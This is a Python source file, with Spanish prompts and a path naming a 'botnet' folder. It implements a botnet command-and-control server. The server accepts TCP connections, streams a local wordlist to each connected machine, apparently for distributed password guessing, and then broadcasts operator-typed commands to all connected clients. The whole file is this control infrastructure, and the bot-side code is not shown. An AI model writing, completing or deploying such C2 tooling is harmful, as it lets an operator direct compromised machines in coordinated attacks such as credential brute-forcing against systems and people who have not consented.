import socket
import threading

clients = []
shutdown_event = threading.Event()

def handle_client_connection(conn, addr):
    print(f"Conexión establecida con {addr}")
    clients.append(conn)
    
    with open('/home/carlosmofe/Escritorio/botnet/test.txt', 'rb') as wordlist:
        for data in iter(lambda: wordlist.read(1024), b''):
            conn.sendall(data)
    conn.sendall(b"FINISHED")
    
    try:
        while not shutdown_event.is_set():
            command = input("Comando: ")
            if command == "exit":
                for client in clients:
                    client.sendall(command.encode())
                conn.close()
                clients.remove(conn)
                break
            for client in clients:
                client.sendall(command.encode())
    except Exception as e:
        print(f"Error: {e}")
        clients.remove(conn)

def server_loop():
    HOST = ''
    PORT = int(input("Establece el puerto a usar: "))
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(5)
        
        while not shutdown_event.is_set():
            conn, addr = s.accept()
            client_thread = threading.Thread(target=handle_client_connection, args=(conn, addr))
            client_thread.start()

if __name__ == "__main__":
    try:
        server_loop()
    except KeyboardInterrupt:
        print("Deteniendo el servidor...")
        shutdown_event.set()